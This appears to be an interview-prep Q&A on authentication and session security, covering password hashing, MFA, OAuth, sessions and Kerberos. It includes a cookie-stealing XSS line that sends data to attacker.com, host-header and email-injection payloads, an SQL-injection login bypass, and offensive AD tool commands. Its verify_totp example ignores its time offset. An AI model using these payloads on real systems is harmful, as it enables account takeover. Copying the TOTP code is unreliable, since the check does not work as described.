# SECURITY ENGINEER INTERVIEW PREP - PART 4
# Authentication & Session Management - Complete Deep Dive
## Jagdeep Singh | 100 Real Q&A

---

## SECTION A: AUTHENTICATION FUNDAMENTALS (Q1-35)

### Q1: What's the difference between authentication and authorization?
**A:**

**Authentication (AuthN)** = Proving WHO you are (username + password, biometrics, tokens, OTPs). "Are you really John?"

**Authorization (AuthZ)** = What you're ALLOWED to do (roles, permissions, access control). "Can John access this resource?"

**Order matters:** Authenticate first, then authorize.

**Common confusion:**
- 401 Unauthorized = Authentication failure (misleading name)
- 403 Forbidden = Authorization failure
- Login screen = AuthN
- "You don't have permission" = AuthZ

**Both can fail independently:**
- Valid login, no access → AuthZ fail
- Bad password → AuthN fail
- IDOR = AuthZ broken
- Weak password = AuthN broken

### Q2: Explain the three factors of authentication
**A:**

**1. Something you KNOW (Knowledge factor):** Passwords, PINs, security questions, passphrases. Weakness: Can be shared, guessed, phished, leaked.

**2. Something you HAVE (Possession factor):** Hardware tokens (YubiKey), phone (SMS/app-based OTP), smart cards, authenticator apps. Weakness: Can be stolen, lost, intercepted (SMS).

**3. Something you ARE (Inherence factor):** Fingerprints, face recognition, voice, retina/iris, behavioral biometrics. Weakness: Can't be changed if compromised, false positives/negatives.

**Multi-factor authentication (MFA):** Combines 2+ factors from DIFFERENT categories.
- Password + SMS = 2FA (weak - SMS interception)
- Password + Authenticator App = stronger 2FA
- Password + Hardware Token = strong 2FA

**Newer factors:** Location (GPS, IP), Time (business hours only), Behavior (typing patterns).

### Q3: What makes a password strong? NIST 2024 guidelines
**A:**

**Old guidance (outdated):** 8 chars min, mixed complexity, change every 90 days, no dictionary words. Failed because users created predictable passwords (`Password123!`) and incremental changes.

**NIST 800-63B current guidelines:**

1. **Length over complexity:** 8+ minimum, 64+ allowed. Encourage passphrases: `correct horse battery staple`.
2. **No mandatory complexity:** Don't force special chars/digits.
3. **No periodic changes:** Only change on suspected compromise.
4. **Check against compromised passwords:** HaveIBeenPwned API, block common passwords list.
5. **Allow all characters:** Including spaces, Unicode, emoji.
6. **Show password during entry:** Optional "show" button reduces typos.
7. **No password hints:** Often reveal too much.
8. **Limit failed attempts:** Rate limit, not lockout (avoid DoS).

**Common strong patterns:** Random 16+ char passwords (from manager), long passphrases (4+ random words), Diceware passphrases.

### Q4: How are passwords stored properly?
**A:**

**WRONG ways:** Plain text, reversible encryption (AES), fast hashing (MD5, SHA-1, SHA-256 - too fast for GPUs).

**RIGHT ways:**

**Bcrypt (good):**
```python
import bcrypt
salt = bcrypt.gensalt(rounds=12)
hashed = bcrypt.hashpw(password.encode(), salt)
bcrypt.checkpw(input_password.encode(), hashed)
```
Built-in salt, adjustable cost, slow by design.

**Argon2 (best - 2024 recommendation):**
```python
from argon2 import PasswordHasher
ph = PasswordHasher(time_cost=3, memory_cost=65536, parallelism=4)
hashed = ph.hash(password)
ph.verify(hashed, input_password)
```
Won password hashing competition 2015. Memory-hard (GPU-resistant). Use Argon2id variant.

**Scrypt (acceptable):** Memory-hard, GPU-resistant.

**PBKDF2 (acceptable, older):**
```python
hashed = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)
```

**Comparison:**
| Algorithm | GPU-Resistant | Memory-Hard | Recommended |
|-----------|--------------|-------------|-------------|
| MD5 | No | No | NEVER |
| SHA-256 | No | No | Only for non-password |
| PBKDF2 | Limited | No | Acceptable |
| Bcrypt | Limited | No | Good |
| Scrypt | Yes | Yes | Good |
| Argon2id | Yes | Yes | Best |

### Q5: What's password salting and why is it critical?
**A:**

**Without salt:** Same password = same hash. Rainbow table attack: pre-computed hashes for billions of passwords enable instant cracking.

**With salt:** Unique random value per user prepended/appended before hashing. Different salt per user = different hash even for same password.

**Salt requirements:**
1. Unique per user (not global)
2. Random (cryptographically random)
3. Length 16+ bytes
4. Stored alongside hash (not secret, but unique)

**Storage:** Bcrypt/Argon2 embed salt in hash automatically:
```
$2b$12$randomsaltxxxxxxxxxxxxhashedoutputxxxxxxxx
```

**Salt prevents:**
- **Rainbow tables:** Pre-computed only useful for unsalted
- **Identical password detection:** Can't see if two users have same password
- **Mass cracking:** Even if one cracked, can't compare to others

### Q6: What's pepper in password hashing?
**A:**

**Pepper** = Additional secret added during hashing.

**Difference from salt:**
- **Salt:** Stored in database (unique per user)
- **Pepper:** Stored separately (in app config, HSM)

**Implementation:**
```python
import bcrypt, os
PEPPER = os.environ['PASSWORD_PEPPER']  # 32-byte random secret

def hash_password(password):
    peppered = password + PEPPER
    salt = bcrypt.gensalt(rounds=12)
    return bcrypt.hashpw(peppered.encode(), salt)
```

**Why pepper helps:** Database breach exposes hashes but not pepper. Attacker can't brute force without pepper. Even cracked hashes useless.

**Best practice:** Store pepper in HSM (Hardware Security Module) or secrets manager (AWS Secrets Manager, HashiCorp Vault). Never in code or plain config.

**Risks:** If compromised → loss of advantage. Rotation difficult (requires re-hashing all passwords).

### Q7: HMAC vs regular hashing for passwords
**A:**

**Regular hash (no key):** `hash = sha256(password)` - vulnerable to GPU brute force.

**HMAC (with key):** `hmac = hmac_sha256(key, password)` - similar to pepper, requires secret to verify.

**HMAC alone isn't enough** - still fast (GPU brute-forceable), no work factor.

**Best practice: HMAC + slow hash:**
```python
# Step 1: HMAC (pepper-like)
peppered = hmac.new(KEY.encode(), password.encode(), hashlib.sha256).digest()
# Step 2: Slow hash (work factor)
hashed = bcrypt.hashpw(peppered, salt)
```

Combines secret key protection with adjustable work factor.

### Q8: Common authentication vulnerabilities
**A:**

**Top issues:**
1. **Weak password policies** - short minimum, no breach DB check
2. **No rate limiting** - brute force, credential stuffing possible
3. **Insecure password storage** - plaintext, MD5/SHA-1, no salt, reversible encryption
4. **Username enumeration** - different errors/timing for "user not found" vs "wrong password"
5. **Predictable session tokens** - sequential, time-based, weak random
6. **Session fixation** - session ID not regenerated after login
7. **Insecure password reset** - predictable tokens, no expiration, token in URL
8. **SQL injection in login** - `' OR 1=1--` bypass
9. **2FA bypasses** - weak backup codes, skip endpoints, phone change without re-auth
10. **OAuth vulnerabilities** - open redirect, missing state, token leaks
11. **Default credentials** - admin/admin, manufacturer defaults left enabled
12. **Insecure password recovery** - security questions guessable, email account = takeover, SMS interception

### Q9: How do you test for username enumeration?
**A:**

**Locations to test:**

**1. Login forms:** Compare responses:
```
"Invalid username" vs "Invalid password" (BAD - different)
"Invalid credentials" (GOOD - same for both)
```

**2. Registration:** "Username already taken" (BAD) vs same response for taken/new (GOOD).

**3. Password reset:** "No account with that email" reveals existence.

**Testing methodology:**

**Response differences:**
```
POST /login
username=admin&password=wrong → "Invalid password"
username=xyz999&password=wrong → "User not found"
```

**Timing-based:**
```python
def time_login(username):
    start = time.time()
    requests.post("/login", data={"username": username, "password": "wrong"})
    return time.time() - start

# Existing users take longer (password hash verified)
```

**Response size differences:** Different byte counts reveal existence.

**HTTP status differences:** 401 vs 404.

**Account lockout:** Existing accounts get locked, non-existing don't.

**Mitigation:** Same response/timing/status regardless. Use constant-time comparison.

### Q10: Credential stuffing - detection and prevention
**A:**

**Credential stuffing** = Using stolen credentials from one breach on other sites. Works because 60%+ of users reuse passwords.

**Detection signs:**
- Login attempt spikes from distributed IPs
- Geographic anomalies
- Bot patterns (same User-Agent, sequential timing)
- Lower success rate than usual

**Prevention:**

1. **MFA** - Most effective single defense
2. **Bot detection** - reCAPTCHA v3, behavioral analysis
3. **Rate limiting** - Per-IP and per-account
4. **Breach detection** - HaveIBeenPwned API, notify users
5. **Device fingerprinting** - Identify legitimate device patterns
6. **Account lockout (carefully)** - Risk: DoS via stuffing
7. **Login monitoring** - Alert on new country, new device, multiple failed attempts before success
8. **WAF** - Cloudflare Bot Management, AWS WAF Bot Control, DataDome, PerimeterX

### Q11: TOTP (Time-based One-Time Password) explained
**A:**

**TOTP** = RFC 6238. Generates 6-digit codes based on shared secret + current time.

**Setup:**
1. Server generates 160-bit random secret
2. QR code: `otpauth://totp/Example:user?secret=BASE32SECRET&issuer=Example`
3. User scans with Google Authenticator/Authy
4. Both share the secret

**Generation:**
```python
def generate_totp(secret, time_step=30, digits=6):
    counter = int(time.time() // time_step)
    counter_bytes = struct.pack('>Q', counter)
    key = base64.b32decode(secret.upper())
    hmac_hash = hmac.new(key, counter_bytes, hashlib.sha1).digest()
    offset = hmac_hash[-1] & 0x0F
    code = struct.unpack('>I', hmac_hash[offset:offset+4])[0] & 0x7FFFFFFF
    return str(code % (10**digits)).zfill(digits)
```

**Verification with time window tolerance:**
```python
def verify_totp(secret, user_code, window=1):
    for offset in range(-window, window+1):
        if generate_totp(secret) == user_code:
            return True
    return False
```

**Vulnerabilities:**
1. **Phishing** - User enters code on fake site, attacker uses immediately
2. **Real-time MitM** - Modlishka, Evilginx capture code
3. **Replay** - If code reused (poor implementation)
4. **Secret theft** - DB breach exposes secrets

**Defenses:** Push notifications, hardware tokens (WebAuthn), authentication context warnings.

### Q12: WebAuthn / FIDO2 explained
**A:**

**WebAuthn** = Web Authentication API. **FIDO2** = WebAuthn + CTAP. Phishing-resistant authentication standard.

**Registration:**
1. User initiates registration
2. Site sends challenge to browser
3. Authenticator (YubiKey, TouchID, Windows Hello) generates key pair
4. Public key sent to server, private key stays on device
5. Server stores public key for user

**Authentication:**
1. Site sends challenge (random nonce)
2. Browser asks authenticator to sign challenge
3. Authenticator signs with private key (binds to ORIGIN)
4. Server verifies with public key

**Why phishing-resistant:** Signed challenge includes origin. On phishing site `fakesite.com`, authenticator signs that origin. Real site sees wrong origin in signature → fails.

**JavaScript usage:**
```javascript
// Registration
const credential = await navigator.credentials.create({
  publicKey: {
    challenge: new Uint8Array([...]),
    rp: { name: "Example Corp", id: "example.com" },
    user: { id: new Uint8Array([1,2,3]), name: "user@example.com", displayName: "User" },
    pubKeyCredParams: [{ alg: -7, type: "public-key" }],
    authenticatorSelection: { userVerification: "required" }
  }
});

// Authentication
const assertion = await navigator.credentials.get({
  publicKey: {
    challenge: new Uint8Array([...]),
    allowCredentials: [{ id: storedCredentialId, type: "public-key" }]
  }
});
```

**Benefits:** Phishing-resistant, no shared secret, better UX, no passwords/SMS interception.

### Q13: What are passkeys?
**A:**

**Passkey** = WebAuthn credential synced across devices.

**Traditional WebAuthn:** Credential bound to single device. Lose device = lose access.

**Passkeys:** Credentials synced via iCloud Keychain, Google Password Manager. Multiple devices share same passkey.

**Cross-platform usage:** On Windows PC, click "Sign in with passkey" → shows QR → scan with iPhone → confirms with FaceID → authenticates PC.

**Security model:** Cloud provider has encrypted backup, end-to-end encrypted, provider can't read passkeys.

**Adoption:** Apple (iOS 16+), Google (Android, Chrome), Microsoft (Windows 11). Sites: Google, Apple, Microsoft, GitHub, eBay, PayPal.

**Concerns:**
- Pro: Phishing-resistant, better UX, no password to leak
- Con: Cloud provider dependency, account recovery still password-based, privacy concerns

### Q14: SMS-based 2FA - why is it weak?
**A:**

**SMS 2FA attacks:**

1. **SIM swapping** - Attacker convinces telecom to transfer victim's number via social engineering or insider help
2. **SS7 attacks** - Telecom protocol weaknesses intercept SMS
3. **Phishing + real-time** - User enters code from real SMS into phishing page, attacker uses immediately
4. **Malware on phone** - Reads SMS messages, especially Android
5. **Network operator compromise** - Insider attacks, hacked operator systems
6. **Reception unreliability** - Roaming, poor signal, code arrives late

**Better alternatives:**
- **Authenticator apps (TOTP)** - No SMS, offline-capable
- **Push notifications** - Sent to app, includes context
- **Hardware tokens** - YubiKey, phishing-resistant
- **WebAuthn/Passkeys** - Best option

**NIST 800-63B deprecated SMS for sensitive accounts.**

### Q15: Account lockout - implementation and problems
**A:**

**Implementation:**
```python
def login(username, password):
    user = get_user(username)
    if user.failed_attempts >= 5:
        if datetime.now() - user.last_failed_attempt < timedelta(minutes=30):
            return "Account locked"
        else:
            user.failed_attempts = 0
    if verify_password(password, user.hash):
        user.failed_attempts = 0
    else:
        user.failed_attempts += 1
```

**Problems:**

1. **DoS attack** - Attacker locks out users intentionally (admin@example.com)
2. **Username enumeration** - Locked accounts behave differently
3. **Doesn't prevent credential stuffing** - One attempt per account distributed
4. **User experience** - Legitimate users locked, support burden
5. **Race conditions** - Concurrent attempts may not increment properly

**Better alternatives:**

**1. Rate limiting (preferred):**
```python
def is_rate_limited(username, ip):
    key = f"login:{ip}"
    attempts = redis.incr(key)
    redis.expire(key, 60)
    return attempts > 10
```

**2. Progressive delays:**
```python
def login_delay(failed_count):
    return min(2 ** failed_count, 60)
```

**3. CAPTCHAs** after N failed attempts

**4. Notify user** of multiple failed attempts

**5. Adaptive authentication** - risk-based scoring

### Q16: Password reset flow - what can go wrong?
**A:**

**Standard flow vulnerabilities:**

**1. Email entry - username enumeration:** "Email not found" reveals non-users. Use "If account exists, email sent".

**2. Reset link generation - predictable tokens:**
```python
# Bad
token = base64(user_id + timestamp)
# Good
token = secrets.token_urlsafe(32)
```

**3. Email transmission** - plain text over network, email server compromised

**4. Link in URL** - Logged in browser history, sent in Referer, server logs

**5. Token storage in DB** - Plain text vs hashed:
```python
# Good - hash before storing
user.reset_token_hash = hash(token)
```

**6. Token expiration** - No expiration or too long. Set 1 hour max.

**7. Token reuse** - Same token works multiple times. Invalidate after use.

**8. Password change without old password** - If reset link compromised, no extra verification.

**9. Session invalidation** - Active sessions remain after password change. Should invalidate all.

**10. No notification** - User unaware of password change. Should email with time, IP, browser, revert link.

### Q17: Password reset vulnerabilities to test
**A:**

**Testing checklist:**

**1. Token in URL → Referer leak** - Visit external site after reset, check Referer.

**2. Token reuse** - Use reset link, try again, should fail.

**3. Token predictability** - Request multiple tokens, compare for patterns.

**4. Token not expiring** - Get link, wait 24+ hours, try use.

**5. Email field manipulation:**
```
POST /reset
email=victim@example.com&new_password=hacked
```
If accepts without token → bypass.

**6. Host header injection:**
```
POST /forgot-password
Host: attacker.com
```
Reset email contains attacker.com URL.

**7. Cross-account reset:**
```
POST /change-password
{"userId": 999, "new_password": "hacked"}
```

**8. Token in response** - Some apps return token in JSON response.

**9. Email parameter injection:**
```
email=victim@example.com,attacker@evil.com
email=victim@example.com%0ABcc:attacker@evil.com
```

**10. Race condition** - Race two password change requests.

### Q18: "Remember me" functionality - secure implementation
**A:**

**Insecure implementations:**
- Username/password in cookie (theft = permanent compromise)
- Sequential remember tokens (predictable)
- Long-lived session cookies (30+ days = high risk)

**Secure implementation - token rotation:**
```python
def use_remember_token(token):
    user = User.objects.filter(remember_token=hash(token)).first()
    if user:
        # Issue NEW token, invalidate old
        new_token = secrets.token_urlsafe(32)
        user.remember_token = hash(new_token)
        user.save()
        response.set_cookie('remember', new_token, max_age=30*24*3600, 
                          secure=True, httponly=True)
        return user
```

**Series-based theft detection:**
```python
class RememberToken:
    series = CharField()  # Device identifier
    token = CharField()   # Rotating

def use_remember_token(series, token):
    rt = RememberToken.objects.get(series=series)
    if rt.token == hash(token):
        # Rotate
        new_token = secrets.token_urlsafe(32)
        rt.token = hash(new_token)
        rt.save()
    else:
        # Wrong token but valid series = THEFT
        Session.objects.filter(user=rt.user).delete()
        RememberToken.objects.filter(user=rt.user).delete()
        send_security_alert(rt.user)
```

**Require re-auth for sensitive ops** even when "remembered" (password change, email change, transactions).

### Q19: SSO (Single Sign-On) how it works
**A:**

**SSO** = Authenticate once, access multiple apps.

**Common protocols:**
- **SAML** - Enterprise, XML-based
- **OAuth 2.0 + OIDC** - Modern, web/mobile, JSON
- **Kerberos** - Windows AD, ticket-based

**OIDC flow:**
```
1. User clicks "Login with Google"
2. App redirects to Google with client_id, redirect_uri, scope, state
3. User authenticates on Google
4. Google redirects back with code
5. App backend exchanges code for tokens (POST /token with client_secret)
6. Google returns access_token, id_token (JWT), refresh_token
7. App verifies id_token signature
8. App extracts user info from id_token
9. App creates local session
```

**SAML flow:**
1. User accesses SP, redirected to IdP with AuthnRequest
2. User authenticates with IdP
3. IdP creates signed SAML assertion (XML)
4. SP verifies signature, creates session

**SSO vulnerabilities:**
1. **Open redirect** - redirect_uri not strictly validated
2. **State parameter missing** - No CSRF protection
3. **Insufficient session timeout** - Compromise = access to all apps
4. **SAML signature wrapping** - Modify assertion bypassing signature check
5. **JWT vulnerabilities** - Algorithm confusion, weak signatures

### Q20: Session hijacking attacks
**A:**

**Methods:**

**1. Session sniffing (network)** - HTTP plaintext cookies, public WiFi. Mitigation: HTTPS, HSTS, secure cookie flag.

**2. XSS to steal cookies:**
```javascript
new Image().src = `http://attacker.com/?c=${document.cookie}`;
```
Mitigation: HttpOnly cookie flag.

**3. CSRF (related)** - Using victim's cookies via cross-site request. Mitigation: SameSite cookies, CSRF tokens.

**4. Session prediction** - Old apps had sequential IDs. Mitigation: 32+ byte cryptographic random.

**5. Session fixation:**
```
1. Attacker gets session ID: SESSION=abc123
2. Tricks victim to use that ID
3. Victim logs in with SESSION=abc123
4. App associates abc123 with victim's account
5. Attacker uses abc123 → logged in as victim
```
Mitigation: Regenerate session ID after login.

**6. Physical access** - Unattended logged-in computer. Mitigation: Auto-logout, screen locks.

**7. Malware** - Browser extensions, keyloggers. Mitigation: Antivirus, careful installation.

### Q21: How are session tokens generated securely?
**A:**

**Bad ways:** Sequential, time-based, weak random (random.random()), MD5 of user data.

**Good ways - cryptographically secure:**
```python
# Python
import secrets
session_id = secrets.token_urlsafe(32)  # 256-bit

# Node.js
const sessionId = crypto.randomBytes(32).toString('base64url');

# Java
SecureRandom random = new SecureRandom();
byte[] bytes = new byte[32];
random.nextBytes(bytes);
String sessionId = Base64.getUrlEncoder().encodeToString(bytes);
```

**Required properties:**
1. Random (true randomness)
2. Long (128+ bits, 256 recommended)
3. Unique (never reused)
4. Unpredictable
5. Tied to user (server-side mapping)

**Storage server-side:**
```
Session token → User ID + metadata
abc123 → user_id=100, expires=..., ip=...
```

Don't put user data IN the token (use opaque IDs). JWT exception: data in token, but signed.

### Q22: Session fixation - prevention
**A:**

**Attack:**
1. Attacker gets `SESSION=abc123`
2. Tricks victim to use that ID (XSS, URL parameter, subdomain)
3. Victim logs in, server associates `abc123` with victim's account
4. Attacker uses `abc123` → logged in as victim

**Prevention:**

**1. Regenerate session ID on login (CRITICAL):**
```python
def login(username, password):
    if authenticate(username, password):
        request.session.cycle_key()  # Django
        # session_regenerate_id(true);  # PHP
        # session.invalidate(); request.getSession(true);  # Java
        request.session['user_id'] = user.id
```

**2. Don't accept session ID from URL:**
```python
# Only from cookie
session_id = request.COOKIES.get('SESSION')
```

**3. Strict cookie attributes:**
```python
response.set_cookie('SESSION', session_id,
    httponly=True, secure=True, samesite='Lax',
    domain='app.example.com')  # Strict, not .example.com
```

**4. Validate session origin (carefully):** Check IP/User-Agent consistency, but not too strict (mobile networks change IPs).

**5. Subdomain protection:** Use specific subdomain (`app.example.com`), not parent (`.example.com`).

### Q23: Session timeout best practices
**A:**

**Two types:**
- **Idle timeout** - Logout after X min inactivity (typical: 15-30 min)
- **Absolute timeout** - Logout after X hours regardless (typical: 8-24 hours)

**Implementation:**
```python
class SessionMiddleware:
    def process_request(self, request):
        session = Session.objects.get(id=session_id)
        
        # Absolute timeout
        if datetime.now() > session.created_at + timedelta(hours=24):
            session.delete()
            return logout_response()
        
        # Idle timeout
        if datetime.now() > session.last_activity + timedelta(minutes=30):
            session.delete()
            return logout_response()
        
        session.last_activity = datetime.now()
        session.save()
```

**Context-aware:**
- Banking: 5-15 min idle, 1 hour absolute
- Email: 30 min idle, 24 hour absolute
- Social media: hours/days
- Internal tools: 8 hours typical

**Re-authentication for sensitive ops:** Even within session, require fresh auth for password change, email change, financial transactions, account deletion, API key generation.

**User notification:** Warn before idle timeout ("Session expires in 2 minutes"), allow extension if active.

### Q24: Multi-device session management
**A:**

**Architecture:** Each device has unique session.

**Session metadata:**
```python
class Session:
    id = UUIDField()
    user = ForeignKey(User)
    created_at = DateTimeField()
    last_activity = DateTimeField()
    device_name = CharField()  # "Jagdeep's iPhone"
    device_type = CharField()  # "mobile", "desktop"
    user_agent = TextField()
    ip_address = GenericIPAddressField()
    country = CharField()
    is_active = BooleanField()
```

**Features:**

**1. List sessions** - Show user all active sessions

**2. Revoke specific session:**
```python
def revoke_session(user, session_id):
    Session.objects.filter(id=session_id, user=user).update(is_active=False)
```

**3. Revoke all other sessions:**
```python
def revoke_all_other(user, current_id):
    Session.objects.filter(user=user).exclude(id=current_id).update(is_active=False)
```

**4. Notify on new device:**
```python
def login(user, request):
    is_new_device = not Session.objects.filter(
        user=user, user_agent=request.user_agent).exists()
    if is_new_device:
        send_email(user.email, "New device login")
```

**5. Suspicious activity detection** - Impossible travel, new devices in short time.

### Q25: OAuth 2.0 grant types
**A:**

**1. Authorization Code Grant (most secure)** - For: Web apps with backend
```
1. GET /authorize?response_type=code&client_id=X&redirect_uri=Y&state=Z
2. User authorizes
3. Redirect with code
4. Backend exchanges code for tokens (with client_secret)
5. Server returns access_token, refresh_token
```
client_secret never exposed to browser.

**2. Authorization Code + PKCE (modern best for SPAs/mobile)** - Adds proof-of-possession
```
1. Generate code_verifier (random)
2. Compute code_challenge = SHA256(code_verifier)
3. /authorize?...&code_challenge=CHALLENGE
4. Get code
5. Exchange code + code_verifier for tokens
```
Even if code intercepted, no code_verifier = no token exchange.

**3. Client Credentials** - Backend-to-backend, no user
```
POST /token {grant_type: "client_credentials", client_id, client_secret}
```

**4. Implicit Grant (DEPRECATED)** - Token in URL fragment, no refresh token.

**5. Resource Owner Password (DEPRECATED)** - User gives password directly to app.

**6. Refresh Token Grant** - Renew expired access tokens
```
POST /token {grant_type: "refresh_token", refresh_token: RT}
```

### Q26: OAuth common vulnerabilities
**A:**

**1. Open redirect in redirect_uri:**
```
/authorize?redirect_uri=https://evil.com
```
Attacker registers their URL, steals auth code. Mitigation: strict whitelist.

**2. State parameter missing/predictable** - CSRF attack on OAuth flow. Attacker initiates flow with their code, tricks victim, victim's account linked to attacker.

**3. CSRF in OAuth login** - If state not validated, victim authenticates with attacker's code → ends up in attacker's account in app.

**4. Authorization code leakage** - Code in Referer header. Mitigation: one-time use, short expiration, HTTPS.

**5. Token leakage** - In URLs (logged), Referer, history, JS errors, server logs. Mitigation: tokens in headers, HTTPS only.

**6. Insufficient redirect URI validation:**
```
Registered: https://app.com/callback
Attacker: https://app.com.evil.com/callback
          https://app.com@evil.com/callback
```
Mitigation: exact match, parse URL properly.

**7. Scope abuse** - App requests more scopes than needed.

**8. Token storage** - localStorage = XSS readable. Use HttpOnly cookies.

**9. JWT vulnerabilities** - Algorithm confusion, none alg, weak keys.

**10. Subdomain takeover** - Attacker controls subdomain → controls redirect URI.

### Q27: OIDC vs OAuth 2.0
**A:**

**OAuth 2.0:** Authorization framework. "Can app A access user's data on service B?" Provides access_token.

**OpenID Connect (OIDC):** Built on OAuth 2.0. Adds authentication. "Who is the user?" Provides id_token (JWT).

| Feature | OAuth 2.0 | OIDC |
|---------|-----------|------|
| Purpose | Authorization | AuthN + AuthZ |
| User Info | API call needed | In id_token |
| Token Format | Opaque | JWT (id_token) |
| Standardized Claims | No | Yes (sub, name, email) |
| Discovery | No | Yes (.well-known) |

**OIDC ID Token:**
```json
{
  "iss": "https://accounts.google.com",
  "sub": "10769150350006150715113082367",
  "aud": "your-client-id",
  "exp": 1311281970,
  "email": "user@gmail.com",
  "email_verified": true,
  "name": "John Doe"
}
```

**Use:** OAuth for API authorization, OIDC for "Sign in with Google/Apple/Microsoft".

### Q28: Secure password reset implementation
**A:**

```python
@app.route('/forgot-password', methods=['POST'])
def forgot_password():
    email = request.form['email']
    user = User.objects.filter(email=email).first()
    
    if user:
        token = secrets.token_urlsafe(32)
        token_hash = hashlib.sha256(token.encode()).hexdigest()
        
        PasswordResetToken.objects.create(
            user=user,
            token_hash=token_hash,
            expires_at=datetime.now() + timedelta(hours=1)
        )
        
        reset_url = f"https://app.com/reset?token={token}"
        send_email(user.email, "Password Reset", f"Reset: {reset_url}")
    
    # ALWAYS same response (prevent enumeration)
    return jsonify({"message": "If account exists, reset link sent."})

@app.route('/reset-password', methods=['POST'])
def reset_password_submit():
    token = request.form['token']
    new_password = request.form['new_password']
    
    if not is_strong_password(new_password):
        return error("Password too weak")
    
    token_hash = hashlib.sha256(token.encode()).hexdigest()
    reset_token = PasswordResetToken.objects.filter(
        token_hash=token_hash,
        expires_at__gt=datetime.now(),
        used=False
    ).first()
    
    if not reset_token:
        return error("Invalid or expired token")
    
    user = reset_token.user
    user.password_hash = hash_password(new_password)
    user.save()
    
    reset_token.used = True
    reset_token.save()
    
    # Invalidate ALL sessions
    Session.objects.filter(user=user).delete()
    # Invalidate all other reset tokens
    PasswordResetToken.objects.filter(user=user).update(used=True)
    
    # Notify
    send_email(user.email, "Password changed", "If not you, contact support.")
    
    return jsonify({"message": "Password changed."})
```

**Security properties:**
1. Token hashed in DB
2. 1 hour expiration
3. One-time use
4. Username enumeration prevented
5. All sessions invalidated
6. All reset tokens invalidated
7. Notification email
8. Strong password required
9. HTTPS only
10. Audit logging

### Q29: Secure registration implementation
**A:**

```python
@app.route('/register', methods=['POST'])
@rate_limit(max=5, per='hour', by='ip')
def register():
    email = request.form['email']
    password = request.form['password']
    
    # 1. Validate
    if not is_valid_email(email):
        return error("Invalid email")
    if not is_strong_password(password):
        return error("Password must be 12+ characters")
    if is_breached_password(password):
        return error("Password appears in data breaches")
    
    # 2. Check existing (avoid enumeration)
    existing = User.objects.filter(email=email).first()
    if existing:
        # Notify existing user, return same generic response
        send_email(existing.email, "Account exists",
                  "Someone tried to register with your email.")
        return jsonify({"message": "Check email to verify."})
    
    # 3. Create unverified user
    user = User.objects.create(
        email=email,
        password_hash=hash_password(password),
        email_verified=False
    )
    
    # 4. Verification token
    token = secrets.token_urlsafe(32)
    EmailVerificationToken.objects.create(
        user=user,
        token_hash=hashlib.sha256(token.encode()).hexdigest(),
        expires_at=datetime.now() + timedelta(days=1)
    )
    
    # 5. Send verification
    send_email(user.email, "Verify email",
              f"Click: https://app.com/verify?token={token}")
    
    # 6. Generic response
    return jsonify({"message": "Check email to verify."})
```

**Additional measures:**
- CAPTCHA
- Disposable email check
- Honeypot fields
- Phone verification (optional)

### Q30: NTLM authentication and weaknesses
**A:**

**NTLM** = NT LAN Manager. Windows authentication protocol.

**Use cases:** Local Windows auth, workgroups, older networks, sometimes AD (but Kerberos preferred).

**NTLMv2 flow:**
1. Client → Server: "I'm John"
2. Server → Client: Random 8-byte challenge
3. Client computes NT hash, combines with challenge, sends response
4. Server validates

**Why weak:**

1. **Pass-the-hash** - Don't need plaintext, just NT hash. Mimikatz extracts hashes.
2. **Relay attacks** - Intercept auth, relay to another server. LLMNR/NBT-NS poisoning.
3. **Weak hashing** - MD4 used, crackable with GPUs (7-char password = minutes).
4. **No mutual authentication** - Server doesn't prove identity to client.
5. **No salt** - Same password = same hash.

**Defense:**
- Disable NTLM (use Kerberos)
- Enforce SMB signing
- SMBv3
- Network segmentation
- Strong passwords
- Monitor NTLM events

**Attack tools:** Responder (LLMNR/NBT-NS poisoning), Mimikatz (hash extraction), Impacket ntlmrelayx.py, CrackMapExec.

### Q31: Kerberos authentication
**A:**

**Kerberos** = Network authentication using tickets. Used in Active Directory.

**Three actors:** Client, KDC (Key Distribution Center: AS + TGS), Service.

**Flow:**

**Phase 1: Get TGT:**
1. Client → AS: "I'm John" + timestamp encrypted with John's password hash
2. AS decrypts with John's hash from DB, verifies
3. AS → Client: TGT + session key

**Phase 2: Get Service Ticket:**
4. Client → TGS: TGT + "I want fileserver.corp.com" + Authenticator
5. TGS validates, issues service ticket
6. TGS → Client: Service ticket + new session key

**Phase 3: Access Service:**
7. Client → Service: Service ticket + Authenticator
8. Service decrypts ticket (has its own key), validates, grants access

**Benefits:** Password never sent over network, mutual authentication, time-limited tickets, SSO.

**Attacks (your CRTP knowledge):**

1. **Kerberoasting** - Request service tickets for service accounts (weak passwords), crack offline. `GetUserSPNs.py -request`, `Rubeus kerberoast`

2. **AS-REP Roasting** - Accounts with "Don't require pre-auth", crack AS-REP offline. `GetNPUsers.py`, `Rubeus asreproast`

3. **Golden Ticket** - Compromise KRBTGT hash, create arbitrary TGTs. Persistent domain admin.

4. **Silver Ticket** - Compromise service account hash, create tickets for that service.

5. **Pass-the-Ticket** - Steal tickets from memory, use elsewhere.

**Defense:** Strong service account passwords (25+ chars), Managed Service Accounts, disable RC4 (use AES), enable pre-auth, KRBTGT rotation, monitoring.

### Q32: Active Directory authentication
**A:**

**Active Directory components:**
- **Domain Controller (DC)** - Authenticates users, stores AD database
- **Domain** - Logical grouping with DNS name (corp.example.com)
- **Forest** - Top-level container
- **OUs** - Containers within domains, GPO applied

**Authentication flow:**
1. User logs in to Windows
2. Workstation → DC for Kerberos auth
3. DC validates credentials
4. User receives TGT
5. Service tickets for each resource

**Common attacks (your CRTP path):**

**1. Recon:** Get-ADUser, Get-ADGroup, Get-ADComputer, BloodHound (`SharpHound.exe -CollectionMethod All`)

**2. Initial access:** Phishing, password spray, default creds

**3. Lateral movement:** Pass-the-hash, pass-the-ticket, Kerberoasting, RDP/SMB/WinRM

**4. Privilege escalation:** Local priv esc, AD ACL abuse, unconstrained delegation

**5. Domain dominance:** Domain Admins compromise, DCSync (read all hashes), Golden Ticket

**Defense:**
- Tiered administration
- Least privilege
- LAPS for local admins
- Privileged Access Workstations (PAWs)
- Just-in-time access
- Microsoft Defender for Identity
- BloodHound, PingCastle audits

### Q33: Cookies vs Tokens
**A:**

**Cookies:**
```
Set-Cookie: SESSION=abc123; HttpOnly; Secure; SameSite=Strict
```
Sent automatically, browser-managed, server-side state (typically), ~4KB limit, browser-only.

**Tokens (JWT):**
```
Authorization: Bearer eyJhbGciOiJIUzI1NiI...
```
Sent explicitly, manual storage, stateless, larger size, cross-platform.

| Feature | Cookies | Tokens |
|---------|---------|--------|
| Storage | Browser | Anywhere |
| Auto-sent | Yes | No |
